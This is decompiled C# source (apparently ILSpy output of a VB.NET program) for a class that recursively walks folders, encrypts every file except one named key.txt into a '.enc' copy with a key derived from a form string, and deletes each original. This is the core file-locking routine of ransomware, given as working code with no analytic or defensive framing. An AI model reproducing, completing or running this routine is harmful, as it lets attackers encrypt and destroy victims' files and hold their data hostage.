using System;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Tree.My;

namespace Tree;

public class getdiskFiles
{
	public static string key;

	public static void ScanFolder(string path)
	{
		string[] directories = Directory.GetDirectories(path);
		foreach (string path2 in directories)
		{
			getFiles(path2);
		}
	}

	public static string RandomString(ref string Length)
	{
		string text = null;
		Random random = new Random();
		int num = Conversions.ToInteger(Length);
		for (int i = 0; i <= num; i = checked(i + 1))
		{
			int num2 = 0;
			do
			{
				num2 = random.Next(30, 122);
			}
			while (!((num2 >= 48 && num2 <= 57) || (num2 >= 65 && num2 <= 90) || (num2 >= 97 && num2 <= 122)));
			text += Conversions.ToString(Strings.Chr(num2));
		}
		return text;
	}

	public static void getFiles(string Path)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		byte[] bytKey = default(byte[]);
		byte[] bytIV = default(byte[]);
		string[] files = default(string[]);
		int num5 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 214:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0025;
						case 5:
							goto IL_0035;
						case 6:
							goto IL_0043;
						case 7:
							goto IL_0051;
						case 8:
							goto IL_006a;
						case 4:
						case 9:
						case 10:
							goto IL_007d;
						case 11:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 12:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_006a:
					num = 8;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text);
					goto IL_007d;
					IL_0051:
					num = 7;
					crypt.Encrypt(text, text + ".enc", bytKey, bytIV);
					goto IL_006a;
					IL_000a:
					num = 2;
					files = Directory.GetFiles(Path);
					num5 = 0;
					goto IL_0016;
					IL_0016:
					if (num5 >= files.Length)
					{
						break;
					}
					text = files[num5];
					goto IL_0025;
					IL_007d:
					num = 10;
					num5 = checked(num5 + 1);
					goto IL_0016;
					IL_0025:
					num = 3;
					if (!text.Contains("key.txt"))
					{
						goto IL_0035;
					}
					goto IL_007d;
					IL_0035:
					num = 5;
					bytKey = crypt.CreateKey(Form1.str);
					goto IL_0043;
					IL_0043:
					num = 6;
					bytIV = crypt.CreateIV(Form1.str);
					goto IL_0051;
					end_IL_0001_2:
					break;
				}
				num = 11;
				ScanFolder(Path);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 214;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
